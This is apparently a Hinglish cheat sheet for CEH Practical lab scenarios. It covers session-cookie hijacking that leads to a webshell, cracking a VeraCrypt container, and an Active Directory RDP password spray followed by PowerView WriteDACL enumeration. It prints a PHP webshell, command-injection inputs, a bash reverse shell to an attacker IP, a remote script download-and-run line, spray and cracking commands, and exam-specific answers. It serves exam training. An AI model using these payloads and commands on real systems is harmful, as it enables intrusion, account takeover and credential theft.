# Cookie Exploit + VeraCrypt + AD WriteDACL (CEH Practical)

**3 scenarios covered:**
1. Website session cookie diya hai → server access
2. Upload directory dhundho → VeraCrypt image → decrypt
3. CEH.CYBERSPHERE domain → RDP password spray → PowerView WriteDACL enum

---

# SCENARIO 1: Session Cookie → Server Access

## Pehle Samjho: Session Cookie Kya Hai?

Jab tu kisi site pe login karta hai, server tujhe ek **session cookie** deta hai (jaise `PHPSESSID=abc123`). Yeh cookie = "main logged-in user hu" ka proof.

**Attack idea:** Agar tujhe kisi admin/user ka cookie mil gaya (question mein diya hai), toh tu **bina password ke** uske account mein ghus sakta hai. Phir admin panel se server access (file upload / command execution).

## Step 1: Recon

```
nmap -sV -p- <IP>
```

```
whatweb http://<IP>
```

## Step 2: Cookie Set Karna

**Method A — Browser (Easiest):**

1. Site open kar browser mein
2. **F12** (DevTools) → **Application** tab → **Cookies**
3. Site URL select kar
4. **Add/Edit cookie:**
   - Name: `PHPSESSID` (ya jo diya hai — `session`, `JSESSIONID`, `auth`)
   - Value: `<given-cookie-value>`
5. Page **refresh** kar → ab tu logged in hai

**Method B — curl:**

```
curl -b "PHPSESSID=<cookie-value>" http://<IP>/dashboard.php
```

```
curl -b "PHPSESSID=<cookie-value>" http://<IP>/admin/
```

**Method C — Burp Suite:**

Request intercept → `Cookie:` header mein value daal → forward.

## Step 3: Authenticated Area Access

Cookie set hone ke baad explore kar:
```
http://<IP>/admin/
http://<IP>/dashboard.php
http://<IP>/profile.php
http://<IP>/upload.php
```

## Step 4: Server Access (Shell Lo)

Admin panel mein dhundh:

**A) File Upload:**
Upload PHP shell:
```php
<?php system($_GET['c']); ?>
```
Save as `shell.php`, upload kar. Access:
```
http://<IP>/uploads/shell.php?c=id
```

**B) Command Injection field** (ping, lookup, search):
```
127.0.0.1; id
127.0.0.1 | whoami
```

**C) Admin settings mein code/template edit** → PHP daal.

## Step 5: Reverse Shell

**Listener:**
```
nc -lvnp 4444
```

**Trigger (webshell se):**
```
http://<IP>/uploads/shell.php?c=bash -c 'bash -i >%26 /dev/tcp/<YOUR-IP>/4444 0>%261'
```

## Step 6: Flag

```
whoami
cat /var/www/html/flag.txt
find / -name "flag*" 2>/dev/null
cat /home/*/user.txt
```

## Cookie Manipulation Bonus

Agar cookie **base64** lagta hai (e.g., `dXNlcj1ndWVzdA==`):
```
echo "dXNlcj1ndWVzdA==" | base64 -d
```
Output: `user=guest` → change to `user=admin`:
```
echo -n "user=admin" | base64
```
Naya cookie set kar.

---

# SCENARIO 2: Upload Directory → VeraCrypt Image → Decrypt

## Pehle Samjho: VeraCrypt Kya Hai?

**VeraCrypt** = disk encryption tool. Ek file ke andar pura encrypted "disk" hota hai. Mount karne pe normal folder jaisa dikhta hai, lekin **password ke bina nahi khulta**.

**Attack idea:** Server pe ek VeraCrypt file (encrypted disk) padi hai upload folder mein. Use download kar, password crack/find kar, mount kar, andar ka data (flag) nikal.

## Step 1: Server Access + Upload Dir Dhundh

```
nmap -sV -p- <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

**Common upload paths:**
```
http://<IP>/uploads/
http://<IP>/upload/
http://<IP>/files/
http://<IP>/media/
http://<IP>/wp-content/uploads/
http://<IP>/images/
```

Directory listing khula hoga → files dikhengi.

## Step 2: VeraCrypt File Identify

VeraCrypt files:
- Extension: `.hc`, `.tc`, ya **koi extension nahi** (random name)
- **Size large** (usually 10MB+, round number jaise exactly 10MB)
- `file` command "data" dikhati hai (high entropy)

```
wget http://<IP>/uploads/backup.hc
```

```
file backup.hc
```
Output: `backup.hc: data` → likely encrypted container

```
ls -lh backup.hc
```
(Size check — 5MB/10MB/20MB round = VeraCrypt)

## Step 3: Password Pata Karna

**Option A — Password kahin diya hai:**
- Question text mein
- Server pe koi `.txt`, `note`, `readme` file mein
- Website pe hint

**Option B — Common passwords try:**
```
veracrypt --text --mount backup.hc /mnt/vera --password=password --non-interactive --pim=0 --keyfiles="" --protect-hidden=no
```

Try: `password`, `admin`, `123456`, `veracrypt`, `qwerty`, `letmein`, company name

**Option C — Brute force with hashcat:**

VeraCrypt2John ya direct hashcat:
```
hashcat -m 13721 backup.hc /usr/share/wordlists/rockyou.txt
```

**VeraCrypt hashcat modes:**
| Mode | Encryption |
|------|-----------|
| 13721 | SHA-512 + AES (try this FIRST) |
| 13722 | SHA-512 + Serpent |
| 13723 | SHA-512 + Twofish |
| 13711 | RIPEMD-160 + AES |
| 13751 | SHA-256 + AES |
| 13771 | Streebog-512 + AES |

Agar 13721 fail → try 13711, 13751.

**Option D — John the Ripper:**
```
veracrypt2john backup.hc > vera.hash
john --wordlist=/usr/share/wordlists/rockyou.txt vera.hash
```

## Step 4: Mount Decrypted Volume

```
sudo mkdir /mnt/vera
```

```
sudo veracrypt --text --mount backup.hc /mnt/vera --password=<FOUND-PASSWORD> --pim=0 --keyfiles="" --protect-hidden=no --non-interactive
```

## Step 5: Read Data / Flag

```
ls -la /mnt/vera
```

```
cat /mnt/vera/flag.txt
```

```
find /mnt/vera -type f
```

```
cat /mnt/vera/*.txt
```

## Step 6: Unmount (cleanup)

```
sudo veracrypt --text --dismount /mnt/vera
```

## Agar VeraCrypt Installed Nahi

```
sudo apt install veracrypt -y
```

Ya GUI:
```
veracrypt
```
(Select File → Select Slot → Mount → password daal)

---

# SCENARIO 3: CEH.CYBERSPHERE — RDP Spray + PowerView WriteDACL

## Pehle Samjho: Yeh Question Kya Maang Raha Hai?

- **Domain:** CEH.CYBERSPHERE
- **Known cred:** user `client`, password `H3l3n@444`
- **Task 1:** Password **spraying** attack via RDP (ek password, multiple users pe try)
- **Task 2:** RDP se andar jaake **PowerView** se enumerate karo
- **Final answer:** Carlos ke paas **WriteDACL** rights kis user pe hain? (yaani Carlos kis user ko "manage" kar sakta hai)

**WriteDACL** = ek AD permission. Agar Carlos ke paas kisi user pe WriteDACL hai → Carlos us user ki permissions change kar sakta hai (takeover).

## Step 1: DC IP Pata Karo

```
nmap -p 3389,389,88,445 --open 172.16.32.0/24
```

RDP (3389) + LDAP (389) + Kerberos (88) wala host = **Domain Controller**.

## Step 2: Password Spraying via RDP

**User list banao:**
```
echo "administrator
client
carlos
helen
john
admin
guest
svc_admin
mike
sarah" > users.txt
```

(Better: kerbrute se enum)
```
kerbrute userenum -d CEH.CYBERSPHERE --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Spray (ek password, sab users) — crowbar:**
```
crowbar -b rdp -s <DC-IP>/32 -U users.txt -c 'H3l3n@444'
```

**Ya hydra:**
```
hydra -L users.txt -p 'H3l3n@444' rdp://<DC-IP>
```

**Ya nxc (netexec / crackmapexec):**
```
nxc rdp <DC-IP> -u users.txt -p 'H3l3n@444'
```
```
crackmapexec rdp <DC-IP> -u users.txt -p 'H3l3n@444'
```

**Note:** Tu already `client:H3l3n@444` jaanta hai — yeh valid hai. Spray se confirm hoga aur shayad aur users bhi same password use karte hon.

## Step 3: RDP Login

```
xfreerdp /v:<DC-IP> /u:client /p:'H3l3n@444' /d:CEH.CYBERSPHERE /cert-ignore /size:1280x720
```

**Agar xfreerdp nahi:**
```
rdesktop -u client -p 'H3l3n@444' -d CEH.CYBERSPHERE <DC-IP>
```

**Agar password mein special char issue:**
```
xfreerdp /v:<DC-IP> /u:client /d:CEH.CYBERSPHERE /cert-ignore
```
(password GUI mein type kar)

## Step 4: PowerView Load Karo (Windows ke andar)

PowerShell open kar (Start → PowerShell, right-click Run as Admin agar possible):

```
powershell -ep bypass
```

**PowerView dhundho:**
```
Get-ChildItem -Path C:\ -Filter "PowerView.ps1" -Recurse -ErrorAction SilentlyContinue
```

**Common locations:**
```
. C:\Tools\PowerView.ps1
. C:\Tools\PowerSploit\Recon\PowerView.ps1
. C:\Users\Public\PowerView.ps1
. C:\Users\client\Desktop\PowerView.ps1
```

(Dot-space-path = "dot source", isse functions load hote hain)

**Agar PowerView nahi mila — download:**
```
IEX(New-Object Net.WebClient).DownloadString('http://<YOUR-IP>/PowerView.ps1')
```
(Apni machine pe `python3 -m http.server 80` chala ke serve kar)

## Step 5: WriteDACL Rights Find — THE COMMAND

**Carlos kis user pe WriteDACL rakhta hai:**

```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser -Identity carlos).objectsid -and $_.ActiveDirectoryRights -match "WriteDacl"} | Select ObjectDN, ActiveDirectoryRights
```

**Output example:**
```
ObjectDN                                  ActiveDirectoryRights
--------                                  ---------------------
CN=Michael,CN=Users,DC=CEH,DC=CYBERSPHERE WriteDacl
```

→ **Answer: `Michael`** (ObjectDN ka CN part)

## Step 6: Alternative Commands (agar upar wala kuch na de)

**Method 2 — Find-InterestingDomainAcl:**
```
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq "carlos"} | Select ObjectDN, ActiveDirectoryRights, IdentityReferenceName
```

**Method 3 — Saare WriteDacl, phir carlos dhundh:**
```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"} | Select ObjectDN, IdentityReferenceName | Format-Table -AutoSize
```
(Output mein `IdentityReferenceName = carlos` wali row dekho → uska `ObjectDN`)

**Method 4 — Carlos ka SID pehle:**
```
Get-DomainUser carlos | Select samaccountname, objectsid
```
Phir woh SID match kar:
```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<CARLOS-SID>" -and $_.ActiveDirectoryRights -match "WriteDacl"}
```

## Step 7: Answer Format

Question maang raha hai "konsa user manage kar sakta hai" → **ObjectDN ka username part**:
- Output: `CN=Michael,CN=Users,DC=CEH,DC=CYBERSPHERE`
- **Submit:** `Michael` (sirf naam)
- Galat ho toh full DN ya `michael` (lowercase) try kar

## Bonus — BloodHound (Alternative to PowerView)

Agar PowerView confuse kare:
```
bloodhound-python -d CEH.CYBERSPHERE -u client -p 'H3l3n@444' -ns <DC-IP> -c all
```
BloodHound GUI mein import → Carlos node → "Outbound Object Control" → WriteDACL edge dekho.

---

## Common Mistakes (Teeno Scenarios)

### Cookie Scenario
1. ❌ Cookie name galat (`PHPSESSID` vs `session` vs `JSESSIONID`)
   ✅ Question mein jo exact naam diya, wahi use kar
2. ❌ Cookie set karke refresh nahi kiya
   ✅ Set → **F5 refresh** → tab logged in
3. ❌ Sirf cookie se flag dhundhna
   ✅ Cookie = entry, phir **server access** (upload/cmd injection) chahiye

### VeraCrypt Scenario
1. ❌ Hashcat mode galat (`-m 13721` har baar)
   ✅ Fail ho toh 13711, 13751 bhi try kar
2. ❌ `file` command pe `.hc` ko ignore karna
   ✅ Large "data" file = VeraCrypt suspect
3. ❌ Password server pe dhundha nahi
   ✅ Decrypt se pehle site/server pe note/readme dekho
4. ❌ `sudo` bhul jaana mount mein
   ✅ `sudo veracrypt --mount` (root chahiye)

### AD WriteDACL Scenario
1. ❌ PowerView import nahi hua (`.\PowerView.ps1` directly run kiya)
   ✅ **Dot source:** `. C:\path\PowerView.ps1`
2. ❌ Execution policy block
   ✅ `powershell -ep bypass` se start kar
3. ❌ Carlos ko "kis pe rights hai" vs "kiska rights carlos pe hai" confuse
   ✅ Question: Carlos **manage karta hai** = Carlos = SecurityIdentifier, target = ObjectDN
4. ❌ Answer mein full DN daala jab sirf naam chahiye
   ✅ Pehle short name try, phir full DN

---

## Quick Decision Tree

```
Question:
│
├─ "Session cookie diya hai / cookie se access"
│   → Browser F12 → Application → Cookies → set value → refresh
│   → Admin panel → file upload / cmd injection → reverse shell
│   → cat flag
│
├─ "Upload directory / VeraCrypt / encrypted disk image"
│   → gobuster → /uploads/ → wget .hc file
│   → file + size check (large data = VeraCrypt)
│   → password: question/server note → try
│   → fail? hashcat -m 13721 file rockyou.txt
│   → veracrypt --mount → ls /mnt/vera → cat flag
│
└─ "Domain / RDP spray / PowerView / WriteDACL"
    → nmap -p 3389,389,88 (find DC)
    → crowbar -b rdp -s DC/32 -U users.txt -c 'password'
    → xfreerdp /v:DC /u:user /p:'pass' /d:DOMAIN
    → powershell -ep bypass
    → . C:\Tools\PowerView.ps1
    → Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser carlos).objectsid -and $_.ActiveDirectoryRights -match "WriteDacl"}
    → ObjectDN ka naam = answer
```

---

## TL;DR — Sabse Important Commands

### Cookie → Server
```
curl -b "PHPSESSID=<value>" http://<IP>/admin/
```
(Browser: F12 → Cookies → set → refresh)

### VeraCrypt
```
hashcat -m 13721 file.hc /usr/share/wordlists/rockyou.txt
sudo veracrypt --text --mount file.hc /mnt/vera --password=<pw> --pim=0 --keyfiles="" --protect-hidden=no
```

### AD WriteDACL (THE command)
```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser carlos).objectsid -and $_.ActiveDirectoryRights -match "WriteDacl"} | Select ObjectDN
```

**Yeh 3 ratt le — teeno scenarios cover.**
